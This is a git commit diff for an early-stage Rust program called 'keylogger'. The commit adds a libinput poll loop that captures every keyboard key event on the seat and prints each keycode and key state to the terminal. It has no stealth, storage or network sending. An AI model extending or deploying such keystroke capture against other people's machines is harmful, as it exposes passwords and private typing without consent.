39f6aa75c071f3e3e6c4fd987b748fe33eed030d
Polochon-street <polochonstreet@gmx.fr>
2019-05-12 16:00:13 +0200

    Added keycodes

--- keylogger/src/main.rs
+++ keylogger/src/main.rs
@@ -1,24 +1,26 @@
-extern crate udev;
-extern crate libc;
 extern crate input;
-extern crate std;
+extern crate libc;
 extern crate nix;
+extern crate std;
+extern crate udev;
 
-use udev::Context;
-use input::{Libinput, AsRaw, FromRaw};
-use input::Device as DeviceStruct;
-use input::Event::Device;
-use std::os::unix::io::{AsRawFd, RawFd};
 use input::event::device::DeviceEvent::Added;
-use std::path::Path;
-use std::fs::OpenOptions;
-use std::os::unix::io::{IntoRawFd};
-use std::os::unix::fs::OpenOptionsExt;
-use nix::unistd::close;
-use input::ffi::libinput_event_get_device;
-use input::ffi::libinput_event;
 use input::event::EventTrait;
-use input::DeviceCapability::Keyboard;
+use input::Event::{Keyboard, Device};
+use input::event::keyboard::KeyboardEvent::Key;
+use input::event::keyboard::KeyboardEventTrait;
+use input::Libinput;
+use nix::unistd::close;
+use std::fs::OpenOptions;
+use std::os::unix::fs::OpenOptionsExt;
+use std::os::unix::io::IntoRawFd;
+use std::os::unix::io::{AsRawFd, RawFd};
+use std::path::Path;
+use std::process::exit;
+use udev::Context;
+use std::os::unix::io::FromRawFd;
+use std::fs::File;
+use nix::poll;
 
 struct InputInterface;
 
@@ -26,14 +28,10 @@ impl input::LibinputInterface for InputInterface {
     fn open_restricted(&mut self, path: &Path, flags: i32) -> Result<RawFd, i32> {
         let mut options = OpenOptions::new();
         options.read(true).write(true).custom_flags(flags);
-        match options.open(path) {
-            Ok(f) => {
-                Ok(f.into_raw_fd())
-            }
-            Err(e) => {
-                Err(e.raw_os_error().unwrap())
-            }
-        }
+        options
+            .open(path)
+            .map_err(|e| e.raw_os_error().unwrap())
+            .map(|x| x.into_raw_fd())
     }
 
     fn close_restricted(&mut self, fd: RawFd) {
@@ -42,21 +40,26 @@ impl input::LibinputInterface for InputInterface {
 }
 
 fn main() {
-    let input_interface = InputInterface { };
+    let input_interface = InputInterface {};
     let udev_context = Context::new().unwrap();
     let mut libinput_context = Libinput::new_from_udev(input_interface, &udev_context);
     libinput_context.udev_assign_seat("seat0").unwrap();
     libinput_context.dispatch().unwrap();
-    
-    for context in libinput_context {
-        let device = match context {
-            Device(Added(a)) => a.device(),
-            _ => panic!("coucou"),
-        };
-        if device.name().to_lowercase().contains("keyboard") && device.has_capability(Keyboard) {
-            println!("Device found!");
-            println!("{}", device.name());
-            println!("{}", device.sysname());
+
+    let fd = libinput_context.as_raw_fd();
+    let pollfd = poll::PollFd::new(fd, poll::POLLIN);
+
+    while poll::poll(&mut [pollfd], -1).is_ok() {
+        libinput_context.dispatch().unwrap();
+        let mut events = libinput_context.clone().filter_map(|event| {
+            match event {
+                Keyboard(Key(key)) => Some(key),
+                _ => None,
+            }
+        });
+        for event in events {
+            println!("{:?}", event.key());
+            println!("{:?}", event.key_state());
         }
     }
 }
